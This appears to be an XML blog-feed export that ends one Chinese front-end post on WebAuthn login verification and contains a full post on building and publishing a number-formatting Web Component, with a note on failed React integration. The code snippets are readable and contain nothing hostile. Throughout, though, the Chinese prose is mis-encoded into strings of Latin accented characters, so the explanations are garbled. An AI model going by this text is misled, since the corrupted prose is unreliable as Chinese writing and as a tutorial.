è·Ÿè¨»å†Šæ™‚æ¯”è¼ƒä¸åŒçš„æ˜¯ allowCredentialsï¼Œé€™æ¬„ä½æ˜¯ Servers ç«¯æƒ³è¦ç€è¦½å™¨æä¾›çš„ credentials è³‡è¨Šï¼Œç”¨ä¾†èªè­‰ä½¿ç”¨è€…ï¼Œå…¶ä¸­ id ç‚ºè¨»å†Šæ™‚ç²å–çš„ credentialIdã€‚æ­¤å¤–ä¹Ÿèƒ½æŒ‡å®šè¦ç”¨å“ªç¨®æ–¹å¼å‚³è¼¸ credentials (usbã€bluetooth æˆ– NFC)ã€‚ä½ å¯ä»¥å¡«å…¥å¤šå€‹ credentialIdï¼Œauthenticator æœƒæ‰¾å‡ºä»–èªè­˜çš„ä¾†ä½¿ç”¨ã€‚
navigator.credentials.get å–å¾—çš„ assertion ä¹Ÿæ˜¯ä¸€å€‹ PublicKeyCredential objectï¼Œè·Ÿè¨»å†Šæ™‚çš„å·®åˆ¥åœ¨æ–¼ï¼Œé€™æ¬¡æˆ‘å€‘æ‹¿åˆ°çš„å¤šäº† signatureï¼Œå°‘äº† public keyã€‚
console.log(assertion);PublicKeyCredential &#123;    id: &#x27;ADSUllKQmbqdGtpu4sjseh4cg2TxSvrbcHDTBsv4NSSX9...&#x27;,    rawId: ArrayBuffer(59),    response: AuthenticatorAssertionResponse &#123;        authenticatorData: ArrayBuffer(191),        clientDataJSON: ArrayBuffer(118),        signature: ArrayBuffer(70),        userHandle: ArrayBuffer(10),    &#125;,    type: &#x27;public-key&#x27;&#125;

åŸºæœ¬çµæ§‹éƒ½å·®ä¸å¤šï¼Œå¤šå‡ºä¾†çš„ signature æ˜¯ç”± private key èˆ‡æ­¤ credential æ‰€ç”¢ç”Ÿï¼Œåœ¨ server ç«¯å¯ä»¥ç”¨ public key ä¾†é©—è­‰æ­¤ signatureã€‚
userHandle å‰‡æ˜¯ authenticator æä¾›çš„ä½¿ç”¨è€… idï¼Œä¹Ÿæ˜¯è¨»å†Šæ™‚ä½¿ç”¨çš„é‚£çµ„ã€‚åœ¨ Server ç«¯å¯ä»¥ç”¨ä¾†é—œè¯ä½¿ç”¨è€…ã€‚
Parsing èˆ‡ Validating ç™»å…¥è³‡æ–™æ‹¿åˆ° assertion å¾Œï¼Œå¯ä»¥é€å¾€ server é€²è¡Œé©—è­‰ï¼Œserver æœƒç”¨è¨»å†Šæ™‚çš„ public key ä¾†é©—è­‰ signatureã€‚
ä¸€æ¨£ï¼ŒServer ç«¯å¯¦ä½œæœ‰å„ç¨®èªè¨€ç‰ˆæœ¬ï¼šGo èˆ‡ Pythonï¼Œç­‰ç­‰ã€‚
é€™é‚Šç°¡å–®èˆ‰ä¾‹ï¼š
é¦–å…ˆï¼Œå¾è³‡æ–™åº«ä¸­å–å¾— credentialã€‚æ¥è‘—åˆ©ç”¨ public key å’Œ client å‚³ä¾†çš„ signature èˆ‡ authenticator data å’Œ SHA-256 hash éçš„ cliendDataJSON åšé©—è­‰ã€‚
const storedCredential = await getCredentialFromDatabase(userHandle, credentialId);const signedData = (authenticatorDataBytes + hashedClientDataJSON);const signatureIsValid = storedCredential.publicKey.verify(signature, signedData);if (signatureIsValid) &#123;    return &quot;Nice! User is authenticated!&quot;;&#125; else &#123;    return &quot;Oops, verification failed.&quot;&#125;

é€™æ¨£æˆ‘å€‘å°±æŠŠä¸€æ®µç„¡å¯†ç¢¼ç™»å…¥çš„è¨»å†Šèˆ‡ç™»å…¥æµç¨‹éƒ½èµ°å®Œäº†ï¼ä¸€æ¨£ï¼Œå¯ä»¥åˆ° https://herrjemand.github.io/FIDO2WebAuthnSeries/WebAuthnIntro/PasswordlessExample.html ä¾†ç©ç©çœ‹å¯¦éš›ä¸€é»çš„ç¯„ä¾‹ã€‚

çµè«–èˆ‡æ›´å¤šè³‡æºä»Šå¤©èŠ±äº†é»æ™‚é–“æŠŠ Web Authentication çš„æ¦‚å¿µèˆ‡å¤§è‡´çš„å¯¦ä½œæ–¹å¼ç­è§£äº†ä¸€ç•ªï¼Œé›–ç„¶æ‰å‰›æˆç‚ºæ¨™æº–ï¼Œé›¢å…¨éƒ¨ç€è¦½å™¨éƒ½æ”¯æ´é‚„éœ€è¦ä¸€é»æ™‚é–“ï¼Œä½†æœ€æ–°ç‰ˆçš„ç€è¦½å™¨å¹¾ä¹éƒ½å·²æ”¯æ´ï¼ˆè‡³å°‘æ¡Œæ©Ÿç‰ˆï¼‰ï¼Œæƒ³å¿…ä¸ä¹…çš„æœªä¾†ï¼Œpasswordless çš„ç™»å…¥æœƒæ˜¯ä¸€ç¨®è¶¨å‹¢ã€‚
é€™é‚Šå†å¤šæä¾›å¹¾å€‹ç¶²ç«™è³‡æºä¾›å¤§å®¶åƒè€ƒï¼Œè£¡é¢æœ‰æ›´ç‚ºè±å¯Œçš„ç¯„ä¾‹ç¨‹å¼ï¼Œä»¥åŠè©³ç´°çš„ API èˆ‡æƒ…å¢ƒè§£èªªï¼š

Duo blog - Duo æ˜¯ Cisco æ——ä¸‹çš„å…¬å¸ï¼Œä¸»è¦ç™¼å±•èˆ‡ Authentication èˆ‡ security ç›¸é—œçš„ç”¢å“ï¼Œä¹Ÿå› æ­¤é‡å° web authentication æœ‰ä¸å°‘çš„æ–‡ç« æ•™å­¸èˆ‡ä»‹ç´¹ã€‚

FIDO2WebAuthnSeries - é€™æ˜¯æˆ‘åœ¨æ‰¾è³‡æ–™éç¨‹ä¸­ç™¼ç¾çš„ç¯„ä¾‹ githubï¼Œè£¡é¢æœ‰å¤šç¨®æƒ…å¢ƒçš„ source code èˆ‡ demoï¼Œæ¨è–¦å¤§å®¶å»ç©ç©çœ‹ï¼Œçœ‹çœ‹ç¨‹å¼ç¢¼ï¼Œæƒ³å¿…æœƒæ›´åŠ äº†è§£ã€‚ä½œè€…ä¹Ÿæœ‰åœ¨ Medium ä¸Šå¯«äº†ä¸€ç¯‡é•·æ–‡ä»‹ç´¹ï¼Œæ›´è©³ç´°çš„èªªæ˜å„ç¨®æƒ…å¢ƒçš„ Web authentication æ‡‰ç”¨æœƒæ˜¯å¦‚ä½•çš„æµç¨‹ï¼Œè€Œæˆ‘å€‘çš„ç¨‹å¼ç¢¼åˆè©²å¦‚ä½•ä¿®æ”¹ã€‚å¦‚æœè¦ºå¾—é€™ç¯‡æ–‡ç« å…§çš„ç¯„ä¾‹èˆ‡èªªæ˜ä¸å¤ æ¸…æ¥šï¼Œå¯ä»¥åˆ°ä»–çš„ medium çœ‹çœ‹ã€‚


è³‡æ–™ä¾†æº
webauthn.guide
Introduction to WebAuthn API
FIDO2WebAuthnSeries
webauthn.io
Web Authentication API - MDN

é—œæ–¼ä½œè€…ï¼š@arvinh å‰ç«¯æ”»åŸç…ï¼Œç†±æ„›æ•¸æ“šåˆ†æå’Œè³‡è¨Šè¦–è¦ºåŒ–
]]></content>
      <tags>
        <tag>web</tag>
        <tag>security</tag>
        <tag>authentication</tag>
      </tags>
  </entry>
  <entry>
    <title>Web Component å¯¦æˆ°</title>
    <url>/2017/03/04/webcomopnent-practice/</url>
    <content><![CDATA[å‰è¨€ä¸Šå€‹æœˆæˆ‘å€‘ä»‹ç´¹é Web Componentï¼Œå¤§è‡´ä¸ŠæŠŠ Web Component çš„ç›¸é—œçŸ¥è­˜éƒ½ä»‹ç´¹ä¸€è¼ªäº†ï¼Œä¹Ÿæä¾›äº†ä¸€äº›ç¯„ä¾‹ï¼Œä½†æ˜¯ä¸¦æ²’æœ‰è£½ä½œå‡ºä¸€å€‹å®Œæ•´å¯ç”¨çš„å…ƒä»¶ï¼Œå› æ­¤ä»Šå¤©å°±å¥½å¥½çš„ä¾†å¯¦åšä¸€å€‹ç°¡æ˜“åˆå¯¦ç”¨çš„ Web Componentï¼ˆå°æˆ‘ä¾†èªªå¾ˆå¯¦ç”¨å•¦â€¦ï¼‰ï¼Œä¸¦ä¸”å°‡ä»–ç™¼ä½ˆåˆ° Webcomponent.org ä¸Šé¢ã€‚æœ€å¾Œä¹Ÿæœƒèªªæ˜ä¸€ä¸‹æˆ‘å˜—è©¦å°‡æˆ‘è£½ä½œçš„ webcomponent èˆ‡ react æ•´åˆçš„å¿ƒå¾—ã€‚
é–‹å§‹å‰é‚„æ˜¯å…ˆçµ¦å¤§å®¶çœ‹ä¸€ä¸‹çœ‹å®Œé€™ç¯‡æ–‡ç« å¾Œå¯ä»¥é”åˆ°çš„æˆæœï¼Œç™¼ä½ˆåˆ° Webcomponent.org ä¸¦æœ‰ inline demoï¼š

format-num webcomponentrepo
Ideaåœ¨ä¸€äº›æ´»å‹•é é¢æˆ–æ˜¯äº’å‹•æ€§è¼ƒé«˜çš„ç¶²ç«™ä¸­ï¼Œé¡¯ç¤ºåƒèˆ‡äººæ•¸æ˜¯å¾ˆå¸¸è¦‹çš„åŠŸèƒ½ï¼Œè€Œæœ‰äº›æ™‚å€™æˆ‘å€‘ä¸¦ä¸éœ€è¦å¾ˆç¢ºåˆ‡çš„æ•¸ç›®ï¼Œåå€’æ˜¯å¸Œæœ›èƒ½å¤ ç´„åˆ†æˆä»¥ Kï¼ˆåƒï¼‰ æˆ– Mï¼ˆç™¾è¬ï¼‰ ç‚ºå–®ä½ï¼Œé€™æ™‚é€šå¸¸æˆ‘æœƒå¯«å€‹é¡ä¼¼ä¸‹é¢é€™æ¨£çš„å°å‡½å¼ä¾†ä½œè½‰æ›ï¼Œä¸¦åœ¨æ¯å€‹éœ€è¦çš„ React Component ä¸­å» require é€™å€‹å‡½å¼ä½¿ç”¨ï¼š
function formatNumber(num) &#123;    return num &gt; 999 ? (num/1000).toFixed(1) + &#x27;k&#x27; : num&#125;

ä½†å°±åªæ˜¯å€‹å¾ˆç°¡å–®çš„å‡½ç¤ºï¼Œå»æ¯å€‹éœ€è¦çš„ Component éƒ½è¦ require ä¸€æ¬¡ï¼Œä¹…äº†å°±æœƒè¦ºå¾—æ€éº¼ HTML 5 ä¸å‡ºä¸€å€‹ tag æ˜¯å¯ä»¥å¹«æˆ‘æŠŠæ•¸å­—ç›´æ¥åš format çš„å‘¢ï¼Ÿé€™æ¨£æˆ‘å°±åªè¦ç”¨å° Tagï¼Œå°±æœƒæœ‰æˆ‘è¦çš„çµæœäº†ï¼Œä¹Ÿä¸ç”¨ç‰¹åˆ¥å»å¯«å€‹å° functionã€‚
æƒ³åˆ°é€™å°±è¦ºå¾—ä¼¼ä¹æ˜¯å€‹å¥½æ©Ÿæœƒä¾†ç·´ç¿’ä¸€ä¸‹ Web Comopnent çš„å¯¦ä½œï¼Œè€Œä¸”ä¾ç…§ React çš„å®˜æ–¹èªªæ³• Web Component è·Ÿ React æ˜¯å¯ä»¥ç›¸äº’åœ¨å°æ–¹çš„ç’°å¢ƒä¸‹ä½¿ç”¨çš„ï¼é‚£é‚„ç­‰ä»€éº¼å‘¢ï¼
é‚£å°±ä¾†å¯¦ä½œå§æ ¹æ“šä¸Šä¸€æ¬¡çš„å­¸ç¿’ 2017ï¼Œè®“æˆ‘å€‘å†ä¾†çœ‹çœ‹ Web Components å§ï¼ï¼Œå¾ˆå¿«çš„å°±èƒ½å»ºç«‹å¥½åŸºæœ¬çš„æ¶æ§‹ï¼š
formatNum.html&lt;!-- template --&gt;&lt;template id=&quot;format-num-template&quot;&gt;  &lt;style&gt;    :host &#123;      position: relative;    &#125;  &lt;/style&gt;  &lt;span class=&quot;wrapper&quot;&gt;    &lt;slot&gt;&lt;/slot&gt;  &lt;/span&gt;&lt;/template&gt;&lt;!-- custom element --&gt;&lt;script&gt;class formatNum extends HTMLElement &#123;    constructor() &#123;      super();      let shadowRoot = this.attachShadow(&#123;mode: &#x27;open&#x27;&#125;);      const t = document.querySelector(&#x27;#format-num-template&#x27;);      const instance = t.content.cloneNode(true);      shadowRoot.appendChild(instance);      this.shadowDOM = shadowRoot;    &#125;  &#125;  customElements.define(&#x27;format-num&#x27;, formatNum);&lt;/script&gt;

æ¥è‘—æˆ‘é–‹å§‹æ§‹æƒ³é€™å€‹ tag éœ€è¦æœ‰å“ªäº› attribute å¯ä»¥è¨­ç½®ï¼Œæœ€åŸºæœ¬æˆ‘æœƒéœ€è¦èƒ½æŒ‡å®šå°æ•¸é»å¾Œçš„ä½æ•¸ï¼Œä¸¦ä¸”èƒ½æŒ‡å®šè½‰æ›å–®ä½çš„å‹æ…‹ï¼Œå› ç‚ºæœ‰æ™‚å€™å¯èƒ½æœƒéœ€è¦äºŒé€²ä½çš„è½‰æ›ï¼Œä¹Ÿå°±æ˜¯ä»¥ 1024 ç‚ºå–®ä½ï¼Œè€Œæœ‰æ™‚éœ€è¦è¨ˆç®—äººæ•¸æ™‚ï¼Œå‰‡æ˜¯ä»¥ K, M, B ä¾†é¡¯ç¤ºã€‚
å› æ­¤æœƒéœ€è¦è¨­ç½®å…©å€‹ attributeï¼Œdigits èˆ‡ siï¼š
static get observedAttributes() &#123;    return [&#x27;digits&#x27;, &#x27;si&#x27;];&#125;get digits() &#123;    return this.hasAttribute(&#x27;digits&#x27;);&#125;set digits(val) &#123;    if (val) &#123;    this.setAttribute(&#x27;digits&#x27;, val);    &#125; else &#123;    this.removeAttribute(&#x27;digits&#x27;);    &#125;&#125;get si() &#123;    return this.hasAttribute(&#x27;si&#x27;);&#125;set si(val) &#123;    if (val) &#123;    this.setAttribute(&#x27;si&#x27;, val);    &#125; else &#123;    this.removeAttribute(&#x27;si&#x27;);    &#125;&#125;

è¨˜å¾—è¦è¨­ç½® observedAttributesï¼Œé€™æ¨£ä½¿ç”¨è€…æ”¹è®Š tag çš„ digits èˆ‡ si æ™‚ï¼Œæˆ‘å€‘æ‰å¯ä»¥æœ‰å°æ‡‰å‹•ä½œï¼Œä¹Ÿå°±æ˜¯é‡æ–° format ä¸€æ¬¡æ•¸å­—ã€‚
æ¥è‘—åŠ å…¥ä¸‹åˆ—å…©å€‹é—œéµ methodï¼š
attributeChangedCallback(name, oldValue, newValue) &#123;    this.formatNum();&#125;    formatNum() &#123;    const num = this.shadowDOM.querySelector(&#x27;slot&#x27;).textContent;    const digits = this.getAttribute(&#x27;digits&#x27;);    const si = this.hasAttribute(&#x27;si&#x27;);    this.shadowDOM.querySelector(&#x27;slot&#x27;).textContent = this.format(num, digits, si);&#125;

æˆ‘å€‘åœ¨ observedAttributes ä¸­åˆ—èˆ‰çš„ attribute åªè¦æœ‰æ‰€è®Šå‹•éƒ½æœƒè§¸ç™¼ attributeChangedCallbackï¼Œä¸¦ä¸”åŸ·è¡Œ formatNum()ï¼Œè€Œ formatNum() å°±æœƒå¾ shadowDOM ä¸­æŠ“å‡ºæ•¸å­—ï¼Œä¸¦ä¸”å¾ attribute ä¸­æŠ“å‡ºå°æ•¸é»ä½æ•¸ä»¥åŠæ˜¯å“ªç¨®å–®ä½ï¼Œç¶“é format() çš„è½‰æ›å¾Œå†å°‡è³‡æ–™å¡å› shadowDOM ä¸­ã€‚ï¼ˆ format() å°±æ˜¯é¡ä¼¼æœ€ä¸Šæ–¹çš„æ•¸å­—å–®ä½è½‰æ›å‡½ç¤ºï¼Œä¸æ˜¯é‡é»å°±ä¸åˆ—å‡ºï¼Œæœ‰èˆˆè¶£å¯ä»¥åˆ°æˆ‘çš„ git repo é€£çµå»çœ‹ï¼‰
å¯«åˆ°é€™é‚Šçœ‹èµ·ä¾†å°±å¤§åŠŸå‘Šæˆäº†ï¼Œå—¯ï¼Œæˆ‘ä¹Ÿé€™éº¼è¦ºå¾—ã€‚
ä½†æ˜¯äº‹æƒ…å°±æ˜¯æ²’æœ‰æ†¨äººæƒ³å¾—é€™éº¼ç°¡å–®ã€‚
ç•¶æˆ‘åœ¨ html è£¡é¢åŠ ä¸Šæˆ‘æ–°å¢çš„ element &lt;format-num digits=&#39;1&#39;&gt;1234&lt;/format-num&gt; æ™‚ï¼Œç«Ÿç„¶æ¯«ç„¡åæ‡‰ï¼Œå°±åªæ˜¯å€‹ 1234ï¼Œè€Œä¸æ˜¯ 1.2kã€‚
åŸå› æ˜¯æˆ‘ä»¥ç‚ºåœ¨åŸ·è¡Œ formatNum() çš„æ™‚å€™ï¼Œå¯ä»¥å¾ this.shadowDOM.querySelector(&#39;slot&#39;).textContent è£¡é¢å–å¾— slot å…§çš„å€¼çš„ï¼Œä½†ä¼¼ä¹ç„¡æ³•ç›´æ¥é€™æ¨£åšï¼Œå°±ç®—èƒ½é€é shadowDOM å­˜å–ï¼Œç•¶æˆ‘å€‘æƒ³è¦å°‡ format éçš„æ•¸å­—å¡å› tag å…§çš„æ™‚å€™ï¼Œç”±æ–¼åŸå…ˆçš„ 1234 å±¬æ–¼ light DOMï¼Œæˆ‘å€‘éœ€è¦é€é document.querySelect(&#39;format-num&#39;).innerHML çš„æ–¹å¼å»æ”¹å€¼ï¼Œé€™æ¨£è®Šæˆç”±å¤–éƒ¨çš„ contextï¼ˆdocument) ä¾†æ›´æ”¹ light DOMï¼Œä¼¼ä¹æœ‰é»ä¸ç¬¦ web component çš„ç²¾ç¥ï¼Œæ‡‰è©²è¦è®“ä¸€åˆ‡æ“ä½œä¿æŒåœ¨å…§éƒ¨æ‰å°ã€‚
å› æ­¤æ›å€‹æ–¹å¼ï¼Œæˆ‘å€‘ä¸è®“ä½¿ç”¨è€…å°‡å€¼å¯«åœ¨ slot ä¸­ï¼Œè€Œæ˜¯é€é attribute ä¾†è¨­ç½®ï¼Œè€Œæˆ‘å€‘å†å°‡ parse éçš„çµæœåˆ©ç”¨ shadowDOM è¨­ç½®åˆ° slot ä¸­ï¼Œé€™æ¨£å°±èƒ½é †åˆ©é¡¯ç¤ºäº†ï¼
ä¿®æ”¹ç¨‹å¼å¦‚ä¸‹ï¼š
// å¢åŠ  num attributestatic get observedAttributes() &#123;    return [&#x27;digits&#x27;, &#x27;num&#x27;, &#x27;si&#x27;];&#125;get num() &#123;    return this.hasAttribute(&#x27;num&#x27;);&#125;set num(val) &#123;    if (val) &#123;    this.setAttribute(&#x27;num&#x27;, val);    &#125; else &#123;    this.removeAttribute(&#x27;num&#x27;);    &#125;&#125;// ...// ä¿®æ”¹ formatNum()ï¼Œå¾ attribute ä¸­æ‹¿ num çš„å€¼ï¼Œä¸¦é€é shadowDOM å¡é€² slot é¡¯ç¤ºattributeChangedCallback(name, oldValue, newValue) &#123;    if (this.digits || this.num) &#123;    this.formatNum();    &#125;&#125;formatNum() &#123;    const num = this.getAttribute(&#x27;num&#x27;);    const digits = this.getAttribute(&#x27;digits&#x27;);    const si = this.hasAttribute(&#x27;si&#x27;);    this.shadowDOM.querySelector(&#x27;slot&#x27;).textContent = this.format(num, digits, si);&#125;

æˆæœï¼š
JS Bin on jsbin.com
è®“åˆ¥äºº Import ä½ çš„ Webcomponentæœ¬ä¾†æƒ³èªªåšå®Œäº†ï¼Œæº–å‚™è¦ç™¼ä½ˆçš„æ™‚å€™ï¼Œç™¼ç¾éœ€è¦æº–å‚™ Demo pageï¼Œé›–ç„¶æˆ‘éƒ½ç›´æ¥åœ¨ jsbin èˆ‡ codepen ä¸Šæ–¹å¯«ï¼Œé‚„æ²’æœ‰çœŸæ­£åœ¨åˆ¥çš„ page Import é webcomponentï¼Œä½†æƒ³èªªæ‡‰è©²å°±å¾ˆç°¡å–®å•Šï¼ŒæŠŠæˆ‘çš„ code éƒ½æ”¾åœ¨ä¸€å€‹ html å…§ï¼Œç„¶å¾Œé€é &lt;link rel=&quot;import&quot; href=&quot;../src/formatNum.html&quot;&gt; ä¸å°±å¾—äº†ï¼Ÿ
æ­£ç•¶æˆ‘é€™éº¼æƒ³çš„æ™‚å€™ï¼Œå»ç™¼ç¾æˆ‘çš„ demo page ä¸€ç›´ç„¡æ³•æ­£å¸¸é¡¯ç¤ºï¼Œå‡ºç¾ â€œUncaught TypeError: Cannot read property â€˜contentâ€™ of nullâ€ çš„ errorï¼Œæ˜¯åœ¨ custom element constructor çš„åœ°æ–¹ï¼š
const t = document.querySelector(&#x27;#format-num-template&#x27;);const instance = t.content.cloneNode(true);

ç«Ÿç„¶æ‰¾ä¸åˆ°æˆ‘çš„ template ?!
ä»”ç´°ç ”ç©¶äº†å¥½ä¸€é™£å­å¾Œæ‰ç™¼ç¾åˆ°é€™ç¯‡æ–‡ç«  introduction to html imports
è£¡é¢æœ‰æåˆ° html import æ™‚çš„è¡Œç‚ºå·®ç•°ï¼Œèˆ‰ä¾‹ä¾†èªªï¼š
index.html
&lt;link rel=&quot;import&quot; href=&quot;formatNum.html&quot;&gt; // 1.&lt;title&gt;Import Example&lt;/title&gt;&lt;script src=&quot;script3.js&quot;&gt;&lt;/script&gt;     // 4.

formatNum.html
&lt;script src=&quot;js/script1.js&quot;&gt;&lt;/script&gt;  // 2.&lt;script src=&quot;js/script2.js&quot;&gt;&lt;/script&gt;  // 3.

ä»¥ä¸Šé¢çš„ä¾‹å­ä¾†èªªæ˜ï¼Œindex.html è¼‰å…¥ formatNum.htmlï¼Œå…¶ script çš„åŸ·è¡Œé †åºå¦‚ä¸Šé¢æ¨™è¨˜ï¼Œä½† index.html èˆ‡ formatNum.html ä¸­çš„ document ç‰©ä»¶å»éƒ½æ˜¯æŒ‡å‘ index.htmlã€‚
å› æ­¤ç•¶æˆ‘çš„ demo page åœ¨åŸ·è¡Œå­˜åœ¨æ–¼ formatNum.html å…§çš„ scriptï¼Œä¹Ÿå°±æ˜¯ constructor æ™‚ï¼Œdocument å°±æ‰¾ä¸åˆ°å­˜åœ¨æ–¼ formatNum.html å…§çš„ template äº†ã€‚
æ‰€ä»¥è©²æ€éº¼è§£æ±ºå‘¢ï¼Ÿ
ç‚ºäº†è¦ä¿å­˜ä½ formatNum.html è‡ªå·±çš„ document objectï¼Œæˆ‘å€‘å¯ä»¥é€™æ¨£åšï¼š
documentCurrentScript = document._currentScript || document.currentScript;var mainDoc = documentCurrentScript.ownerDocument;

currentScript æ˜¯åªæœ‰åœ¨æœ‰æ”¯æ´ HTML import çš„ç€è¦½å™¨ä¸­æ‰æœ‰çš„å±¬æ€§ï¼Œè‹¥æ˜¯é€é webcomponent.js ç­‰ polyfillï¼Œå‰‡æ˜¯ç”¨ _currentScript
æ‰“åŒ…ç™¼ä½ˆå•é¡Œéƒ½è§£æ±ºä»¥å¾Œç•¶ç„¶å°±è¦ç™¼ä½ˆåˆ° Webcomponent.org ä¸Šé¢å»äº†

å¾ç¶²ç«™ä¸Šçš„æ­¥é©Ÿçœ‹ä¾†å¾ˆç°¡å–®ï¼Œåªè¦ä½ çš„ repository æ»¿è¶³ä¸‰å€‹æ¢ä»¶ï¼Œä¸¦åŠ ä¸Š badge èˆ‡ inline demoï¼Œå°±å¯ä»¥ç™¼ä½ˆäº†ï¼š


ä¸‰å€‹æ¢ä»¶ï¼š

æœ‰ Open source licenseï¼Œåªè¦æ˜¯è¢« Open Source Initative èªå¯çš„éƒ½å¯ä»¥ã€‚

Tagged releaseï¼Œé€™é»å¾ˆé‡è¦ï¼Œä»–æœƒä¾ç…§ä½  repository è£¡é¢çš„ tag å»æŠ“æª”æ¡ˆï¼Œå¦‚æœä½ æ²’æœ‰è¨­ç½®çš„è©±ï¼Œå°±ç®— repo ä¸­æœ‰ç¨‹å¼ï¼Œä¹Ÿæœƒç™¼ä½ˆå¤±æ•—ï¼Œè€Œä¸”å¦‚æœä½ æœ‰æ›´æ–°ï¼Œä¹Ÿä¸€å®šè¦æœ‰æ–°ç‰ˆ Tag releaseï¼ŒWebcomponent.org é€™é‚Šæ‰æœƒæ›´æ–°ã€‚æˆ‘ä¸€é–‹å§‹å› ç‚ºæœ‰äº›è¨­å®šæ²’åšå¥½ï¼Œé‡æ–° push å¾Œå¿˜äº† release tageï¼Œæ€éº¼æ¨£éƒ½æ˜¯ç™¼ä½ˆå¤±æ•—â€¦

READMEï¼Œé€™ç•¶ç„¶ä¹Ÿæ˜¯å¾ˆé‡è¦ï¼Œä½ ç¸½å¾—è¦ä»‹ç´¹ä¸€ä¸‹å…§å®¹ã€‚æ­¤å¤–ï¼Œå¦‚æœä½ æƒ³è¦æ”¾ inline demo çš„è©±ï¼Œä¹Ÿæ˜¯è¦è¨­ç½®åœ¨ README.md ç•¶ä¸­ã€‚


åŠ ä¸Š badgeï¼š
[![Published on webcomponents.org][webcomponents-image]][webcomponents-url][webcomponents-image]: https://img.shields.io/badge/webcomponents.org-published-blue.svg[webcomponents-url]: https://www.webcomponents.org/element/arvinh/format-num

Inline Demoï¼š
è¦è£½ä½œ inline demo å¾ˆç°¡å–®ï¼Œåªè¦åœ¨ä½ çš„ README.md ä¸­åŠ å…¥ï¼š

ä½ åªéœ€è¦åœ¨ &lt;custom-element-demo&gt; ä¸­ import ä½ çš„ custom-element å³å¯ï¼Œhtml block å…§çš„å°±æ˜¯ä½  demo å…ƒä»¶çš„åœ°æ–¹äº†ã€‚
ä»¥æˆ‘çš„ README.md ä¾†èªªï¼Œå®Œæˆå¾Œæœƒé•·é€™æ¨£ï¼š

ç•¶ä½ ç…§è‘—ç¶²ç«™ä¸Šæ‰€å¯«çš„ï¼Œå®Œæˆæ‰€æœ‰æ­¥é©Ÿå¾Œï¼Œå¯ä»¥åˆ°é€™é‚Šå»å¡«å¯« Repo åç¨±ä¸¦é€²è¡Œç™¼ä½ˆã€‚

ç„¶å¾Œä½ æœƒç™¼ç¾ç™¼ä½ˆå¤±æ•—ï¼Œå› ç‚ºç¶²ç«™éš±è—äº†ä¸€å€‹æ­¥é©Ÿæ²’æœ‰å¯«åˆ°ã€‚
ä»–æœƒè¦æ±‚ä½ çš„ repo ä¸­è¦å«æœ‰ bower.jsonï¼Œä½†æ‡‰è©²æ˜¯æ²’æœ‰è¦ä½  register åˆ° bower ä¸­ï¼Œä¸éæˆ‘æœ‰é †æ‰‹æ”¾ä¸Šå»å°±æ˜¯äº†ï¼Œæ‰€ä»¥ä¹Ÿèƒ½é€é bower install format-num ä¾†ä¸‹è¼‰é€™å€‹ webcomponentã€‚
ç¸½ä¹‹ï¼ŒåŠ ä¸Š bower.json ä»¥å¾Œæ‡‰è©²å°±èƒ½é †åˆ©ç™¼ä½ˆäº†ï¼
æ­¤å¤–ï¼Œä½ ä¹Ÿå¯ä»¥åˆ° https://www.webcomponents.org/preview è¼¸å…¥ä½ çš„ git repo urlï¼Œå°±å¯ä»¥åœ¨ç™¼ä½ˆå‰å…ˆé€²è¡Œ previewï¼Œåœ¨é€™é‚Šç”šè‡³èƒ½å‹•æ…‹èª¿æ•´ä½ çš„ inline demoï¼å°±ç”±è®€è€…è‡ªè¡Œç©ç©å§ï¼
Work with React but failedè£½ä½œé€™å€‹ Web Component çš„åˆè¡·æ˜¯å¸Œæœ›èƒ½å¤ é€éå®ƒè®“æˆ‘è¼•é¬†åœ°æ”¾åœ¨ React çš„ component ä¸­ç•¶ä¸€èˆ¬ tag ä½¿ç”¨ï¼Œå› æ­¤æˆ‘ä¹Ÿå˜—è©¦äº†ä¸€ä¸‹ç°¡å–®çš„ç¯„ä¾‹ï¼š
See the Pen web-component:  with React by Arvin (@arvin0731) on CodePen.


ä½†çœ¼å°–çš„è®€è€…æœƒç™¼ç¾ï¼Œæˆ‘åœ¨ html å…§åˆå†å¯«äº†ä¸€æ¬¡ templateâ€¦
æ²’éŒ¯ï¼Œå› ç‚ºå†åº¦é‡åˆ° document å­˜å–ä¸åˆ° template çš„ errorï¼Œé€™æ¬¡é€£ä½¿ç”¨ currentScript éƒ½ç„¡æ³•è§£æ±ºï¼Œæˆ‘æƒ³æ˜¯è·Ÿ Rect compile çš„æ™‚é–“ä»¥åŠ Webcomponent script è¼‰å…¥åŸ·è¡Œçš„æ™‚é–“é †åºæœ‰é—œï¼Œå°è‡´å­˜å–ä¸åˆ°æ­£ç¢ºçš„ document scopeã€‚
ç•¶ç„¶é€™ä¹Ÿåªæ˜¯æˆ‘çš„çŒœæ¸¬ï¼Œè‹¥æœ‰è®€è€…äº†è§£åŸå› è«‹ä¸åæŒ‡æ•™ï¼
åœ¨è©¦è‘—æ•´åˆ React çš„éç¨‹ä¸­ä¹Ÿæœ‰ç™¼ç¾ï¼Œbabel åœ¨è™•ç† extends HTMLElement çš„å…ƒä»¶ä¸Šæœ‰äº›è¡çªï¼Œéœ€è¦é€é babel-plugin-transform-custom-element-classes ä¾†è§£ï¼Œä¸éæ²’æœ‰çœŸæ­£è©¦éï¼Œç•¢ç«Ÿæˆ‘æœƒå¸Œæœ› webcomponent æ˜¯ç¨ç«‹çš„ï¼Œä¸éœ€è¦è·Ÿ React ä¸€èµ·ç¶“é babel çš„ compileï¼Œè€Œåœ¨æ”¯æ´ webcomponent çš„ browser ä¸Šï¼Œç†è«–ä¸Šä¹Ÿä¸éœ€è¦ babel ç·¨è­¯ es6 çš„ code æ‰å°â€¦
çµè«–é›–ç„¶æœ€å¾Œé‚„æ˜¯æ²’èƒ½é †åˆ©æ•´åˆé€² React ç•¶ä¸­ï¼Œä¸éåŸå…ˆé æœŸè¼•é¬†å®Œæˆçš„å°ç©å…·ç«Ÿç„¶é‚„æ˜¯å¡äº†ä¸å°‘é—œï¼Œä¹Ÿæœ‰å­¸ç¿’åˆ°ï¼Œä¸éç¸½æ˜¯å› ç‚ºæ™‚é–“æœ‰é™æ²’è¾¦æ³•å¾ˆå®Œæ•´çš„å°‡æŸ¥åˆ°çš„è³‡æ–™èªçœŸè®€å®Œï¼Œæˆ–è¨±æˆ‘çš„å¯¦ä½œéç¨‹èˆ‡è§€å¿µçš„ç†è§£æœ‰éŒ¯èª¤çš„åœ°æ–¹ï¼Œæ­¡è¿è®€è€…ç•™è¨€æŒ‡æ•™ï¼Œæˆ‘æœƒéå¸¸æ„Ÿæ¿€çš„ï¼
è³‡æ–™ä¾†æº
Web Components org
Introduction to html import
React could love web components

